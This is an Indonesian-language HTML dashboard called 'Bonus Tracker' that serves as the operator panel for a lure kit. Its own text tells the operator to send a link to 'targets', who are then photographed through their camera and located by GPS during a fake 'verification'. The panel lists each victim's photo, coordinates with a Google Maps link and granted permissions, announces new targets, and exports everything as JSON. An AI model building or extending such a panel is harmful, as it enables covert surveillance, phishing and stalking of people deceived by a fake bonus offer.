<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎯 Admin Dashboard | Bonus Tracker</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #0a0e27;
            color: #fff;
            min-height: 100vh;
        }

        /* Header Premium */
        .header {
            background: linear-gradient(135deg, #1a1f3a 0%, #0a0e27 100%);
            padding: 30px;
            border-bottom: 1px solid rgba(102,126,234,0.3);
        }

        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }

        .logo h1 {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .logo p {
            font-size: 12px;
            color: #6c7293;
        }

        .stats-grid {
            display: flex;
            gap: 20px;
        }

        .stat-badge {
            background: rgba(102,126,234,0.2);
            padding: 10px 20px;
            border-radius: 16px;
            text-align: center;
        }

        .stat-badge .number {
            font-size: 28px;
            font-weight: 800;
            color: #667eea;
        }

        .stat-badge .label {
            font-size: 12px;
            color: #8b8fb0;
        }

        /* Dashboard Grid */
        .dashboard {
            max-width: 1400px;
            margin: 30px auto;
            padding: 0 30px;
        }

        /* Quick Stats */
        .quick-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(255,255,255,0.03);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(102,126,234,0.2);
            border-radius: 24px;
            padding: 25px;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            border-color: #667eea;
            transform: translateY(-5px);
        }

        .stat-card .icon {
            font-size: 40px;
            margin-bottom: 15px;
        }

        .stat-card .value {
            font-size: 42px;
            font-weight: 800;
            color: #fff;
        }

        .stat-card .title {
            font-size: 14px;
            color: #8b8fb0;
            margin-top: 5px;
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
            flex-wrap: wrap;
        }

        .tab-btn {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(102,126,234,0.2);
            padding: 12px 24px;
            border-radius: 12px;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .tab-btn:hover {
            background: rgba(102,126,234,0.2);
        }

        .tab-btn.active {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-color: transparent;
        }

        /* Data Cards */
        .data-grid {
            display: grid;
            gap: 20px;
        }

        .data-card {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(102,126,234,0.15);
            border-radius: 20px;
            overflow: hidden;
            transition: all 0.3s ease;
            animation: fadeInUp 0.4s ease;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .data-card-header {
            padding: 20px 25px;
            background: rgba(102,126,234,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }

        .target-id {
            font-weight: 700;
            color: #667eea;
        }

        .target-time {
            font-size: 13px;
            color: #8b8fb0;
        }

        .data-card-body {
            padding: 25px;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .photo-section {
            background: #0a0e27;
            border-radius: 16px;
            padding: 15px;
            text-align: center;
        }

        .photo-section img {
            max-width: 100%;
            border-radius: 12px;
            border: 2px solid rgba(102,126,234,0.3);
        }

        .location-section {
            background: #0a0e27;
            border-radius: 16px;
            padding: 15px;
        }

        .location-section a {
            color: #667eea;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-top: 10px;
        }

        .permission-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            background: rgba(40,167,69,0.2);
            padding: 4px 12px;
            border-radius: 100px;
            font-size: 12px;
            color: #28a745;
        }

        .empty-state {
            text-align: center;
            padding: 80px 20px;
            color: #8b8fb0;
        }

        .empty-state .icon {
            font-size: 80px;
            margin-bottom: 20px;
            opacity: 0.5;
        }

        /* Action Buttons */
        .action-buttons {
            display: flex;
            gap: 12px;
            margin-bottom: 25px;
            flex-wrap: wrap;
        }

        .action-btn {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(102,126,234,0.2);
            padding: 10px 20px;
            border-radius: 10px;
            color: #fff;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .action-btn:hover {
            background: rgba(102,126,234,0.2);
        }

        .action-btn.danger:hover {
            background: rgba(220,53,69,0.2);
            border-color: #dc3545;
        }

        /* Notification */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            padding: 15px 25px;
            border-radius: 12px;
            color: white;
            font-weight: 500;
            z-index: 1000;
            animation: slideInRight 0.3s ease;
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
        }

        @keyframes slideInRight {
            from {
                opacity: 0;
                transform: translateX(100%);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        /* Tab Content */
        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }
    </style>
</head>
<body>

<div class="header">
    <div class="header-content">
        <div class="logo">
            <h1>🎯 Bonus Tracker</h1>
            <p>Real-time target monitoring dashboard</p>
        </div>
        <div class="stats-grid">
            <div class="stat-badge">
                <div class="number" id="totalOnline">0</div>
                <div class="label">Target Hari Ini</div>
            </div>
            <div class="stat-badge">
                <div class="number" id="lastUpdate">--:--</div>
                <div class="label">Last Update</div>
            </div>
        </div>
    </div>
</div>

<div class="dashboard">
    <div class="quick-stats">
        <div class="stat-card">
            <div class="icon">👥</div>
            <div class="value" id="statTotal">0</div>
            <div class="title">Total Target</div>
        </div>
        <div class="stat-card">
            <div class="icon">📸</div>
            <div class="value" id="statPhoto">0</div>
            <div class="title">Foto Terkumpul</div>
        </div>
        <div class="stat-card">
            <div class="icon">📍</div>
            <div class="value" id="statLocation">0</div>
            <div class="title">Lokasi Terdeteksi</div>
        </div>
        <div class="stat-card">
            <div class="icon">⚡</div>
            <div class="value" id="statFlash">0</div>
            <div class="title">Senter Diizinkan</div>
        </div>
    </div>

    <div class="action-buttons">
        <button class="action-btn" onclick="refreshData()">🔄 Refresh Data</button>
        <button class="action-btn" onclick="exportData()">📥 Export JSON</button>
        <button class="action-btn danger" onclick="clearAllData()">🗑️ Hapus Semua</button>
    </div>

    <div class="tabs">
        <button class="tab-btn active" onclick="switchTab('all')">📋 Semua Target</button>
        <button class="tab-btn" onclick="switchTab('photo')">📸 Gallery Foto</button>
        <button class="tab-btn" onclick="switchTab('location')">📍 Peta Lokasi</button>
    </div>

    <div id="allTab" class="tab-content active">
        <div class="data-grid" id="allDataList"></div>
    </div>
    <div id="photoTab" class="tab-content">
        <div class="data-grid" id="photoList"></div>
    </div>
    <div id="locationTab" class="tab-content">
        <div class="data-grid" id="locationList"></div>
    </div>
</div>

<script>
    let allTargets = [];
    let lastCount = 0;

    function loadData() {
        const stored = localStorage.getItem('bonus_targets');
        if(stored) {
            allTargets = JSON.parse(stored);
        } else {
            allTargets = [];
        }

        // Update stats
        document.getElementById('statTotal').innerText = allTargets.length;
        document.getElementById('statPhoto').innerText = allTargets.filter(t => t.camera).length;
        document.getElementById('statLocation').innerText = allTargets.filter(t => t.location).length;
        document.getElementById('statFlash').innerText = allTargets.filter(t => t.flash).length;
        
        const today = new Date().toDateString();
        const todayCount = allTargets.filter(t => new Date(t.timestamp).toDateString() === today).length;
        document.getElementById('totalOnline').innerText = todayCount;
        document.getElementById('lastUpdate').innerText = new Date().toLocaleTimeString();

        // Render semua tab
        renderAllData();
        renderPhotoGallery();
        renderLocationList();

        // Notifikasi target baru
        if(allTargets.length > lastCount) {
            const newTargets = allTargets.slice(lastCount);
            showNotification(`🎯 ${newTargets.length} target baru! Total: ${allTargets.length} orang`);
            lastCount = allTargets.length;
        }
    }

    function renderAllData() {
        const container = document.getElementById('allDataList');
        if(!allTargets.length) {
            container.innerHTML = `
                <div class="empty-state">
                    <div class="icon">📭</div>
                    <h3>Belum Ada Target</h3>
                    <p>Kirim link ke target untuk mulai mengumpulkan data</p>
                </div>
            `;
            return;
        }

        container.innerHTML = allTargets.reverse().map((target, idx) => `
            <div class="data-card">
                <div class="data-card-header">
                    <div>
                        <span class="target-id">🎯 ${target.id}</span>
                        <div style="margin-top: 5px;">
                            ${target.camera ? '<span class="permission-badge">📸 Foto</span>' : ''}
                            ${target.location ? '<span class="permission-badge">📍 Lokasi</span>' : ''}
                            ${target.flash ? '<span class="permission-badge">⚡ Senter</span>' : ''}
                        </div>
                    </div>
                    <div class="target-time">🕐 ${target.waktu || new Date(target.timestamp).toLocaleString('id-ID')}</div>
                </div>
                <div class="data-card-body">
                    ${target.camera ? `
                        <div class="photo-section">
                            <img src="${target.camera}" alt="Foto Target">
                        </div>
                    ` : ''}
                    ${target.location ? `
                        <div class="location-section">
                            <div>📍 Latitude: ${target.location.lat}</div>
                            <div>📍 Longitude: ${target.location.lng}</div>
                            <a href="https://www.google.com/maps?q=${target.location.lat},${target.location.lng}" target="_blank">
                                🌍 Buka Google Maps →
                            </a>
                        </div>
                    ` : ''}
                </div>
            </div>
        `).join('');
    }

    function renderPhotoGallery() {
        const container = document.getElementById('photoList');
        const photos = allTargets.filter(t => t.camera);
        
        if(!photos.length) {
            container.innerHTML = '<div class="empty-state"><div class="icon">📸</div><h3>Belum Ada Foto</h3><p>Target akan terfoto saat verifikasi</p></div>';
            return;
        }

        container.innerHTML = `
            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px;">
                ${photos.map(photo => `
                    <div class="data-card">
                        <div class="data-card-header">
                            <span class="target-id">${photo.id}</span>
                            <span class="target-time">${new Date(photo.timestamp).toLocaleString()}</span>
                        </div>
                        <div class="data-card-body">
                            <img src="${photo.camera}" alt="Foto" style="width: 100%; border-radius: 12px;">
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    }

    function renderLocationList() {
        const container = document.getElementById('locationList');
        const locations = allTargets.filter(t => t.location);
        
        if(!locations.length) {
            container.innerHTML = '<div class="empty-state"><div class="icon">📍</div><h3>Belum Ada Lokasi</h3><p>Lokasi akan terdeteksi saat verifikasi</p></div>';
            return;
        }

        container.innerHTML = locations.map(loc => `
            <div class="data-card">
                <div class="data-card-header">
                    <span class="target-id">${loc.id}</span>
                    <span class="target-time">${new Date(loc.timestamp).toLocaleString()}</span>
                </div>
                <div class="data-card-body">
                    <div>📍 Lat: ${loc.location.lat}</div>
                    <div>📍 Lng: ${loc.location.lng}</div>
                    <a href="https://www.google.com/maps?q=${loc.location.lat},${loc.location.lng}" target="_blank" style="color: #667eea; margin-top: 10px; display: inline-block;">
                        🌍 Lihat di Google Maps →
                    </a>
                </div>
            </div>
        `).join('');
    }

    function showNotification(msg) {
        const notif = document.createElement('div');
        notif.className = 'notification';
        notif.innerHTML = msg;
        document.body.appendChild(notif);
        setTimeout(() => notif.remove(), 4000);
    }

    function refreshData() {
        loadData();
        showNotification('🔄 Data berhasil di-refresh');
    }

    function exportData() {
        const dataStr = JSON.stringify(allTargets, null, 2);
        const blob = new Blob([dataStr], {type: 'application/json'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `target_data_${new Date().toISOString()}.json`;
        a.click();
        URL.revokeObjectURL(url);
        showNotification('📥 Data berhasil di-export');
    }

    function clearAllData() {
        if(confirm('⚠️ PERINGATAN! Yakin hapus SEMUA data target? Data tidak bisa dikembalikan! ⚠️')) {
            localStorage.removeItem('bonus_targets');
            loadData();
            showNotification('🗑️ Semua data telah dihapus');
        }
    }

    function switchTab(tab) {
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
        event.target.classList.add('active');
        document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
        document.getElementById(tab + 'Tab').classList.add('active');
    }

    // Auto refresh setiap 3 detik
    loadData();
    setInterval(loadData, 3000);

    // Listen for storage events (dari target)
    window.addEventListener('storage', (e) => {
        if(e.key === 'bonus_targets') {
            loadData();
            showNotification('📡 Target baru terdeteksi!');
        }
    });
</script>
</body>
</html>
